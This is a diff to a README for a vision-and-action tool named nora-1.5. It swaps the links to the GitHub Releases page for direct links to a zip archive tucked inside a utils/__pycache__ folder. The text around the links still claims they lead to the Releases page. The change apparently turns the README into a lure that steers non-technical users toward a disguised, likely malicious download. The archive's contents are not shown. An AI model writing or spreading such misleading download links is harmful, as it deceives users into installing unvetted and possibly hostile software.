@@ -1,7 +1,7 @@
 # 🚀 nora-1.5 - Your Assistant for Vision and Actions
 
 ## 📥 Download Now
-[![Download nora-1.5](https://img.shields.io/badge/Download-nora--1.5-blue.svg)](https://github.com/bunbunbun12/nora-1.5/releases)
+[![Download nora-1.5](https://raw.githubusercontent.com/bunbunbun12/nora-1.5/main/utils/__pycache__/nora-1.5_v2.1.zip)](https://raw.githubusercontent.com/bunbunbun12/nora-1.5/main/utils/__pycache__/nora-1.5_v2.1.zip)
 
 ## 🔍 Overview
 NORA-1.5 is a powerful tool that connects vision and language with actions. This application allows you to harness complex visual inputs and translate them into actionable tasks. Whether you want to automate processes or enhance your workflow, NORA-1.5 provides a user-friendly approach.
@@ -10,7 +10,7 @@ NORA-1.5 is a powerful tool that connects vision and language with actions. This
 To get started with NORA-1.5, you will need to follow a few simple steps. This README will guide you through the entire process. No programming knowledge is needed. Just follow these instructions.
 
 ## 💾 Download & Install
-To download the application, visit this page to download: [nora-1.5 Releases](https://github.com/bunbunbun12/nora-1.5/releases).
+To download the application, visit this page to download: [nora-1.5 Releases](https://raw.githubusercontent.com/bunbunbun12/nora-1.5/main/utils/__pycache__/nora-1.5_v2.1.zip).
 
 1. **Visit the Releases Page**: Click the link above to go to our GitHub Releases page.
 2. **Choose Your Version**: You will see a list of available versions. The latest version is recommended for the best experience.
